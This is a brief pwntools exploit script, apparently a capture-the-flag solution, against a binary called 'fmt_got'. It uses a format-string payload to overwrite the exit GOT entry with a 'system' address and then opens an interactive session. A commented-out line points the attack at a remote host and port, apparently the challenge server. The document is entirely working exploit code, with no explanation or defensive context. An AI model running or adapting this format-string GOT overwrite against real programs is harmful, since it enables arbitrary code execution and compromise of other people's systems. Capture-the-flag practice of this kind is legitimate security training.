from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#p = remote('8.147.132.32',33177)
p = process('./fmt_got')
exit_got = 0x403430
system_addr = 0x401236
payload = b'B' * 6
payload += fmtstr_payload(11, {exit_got: system_addr},numbwritten=40)
p.sendlineafter(b'> ', payload)
p.interactive()   
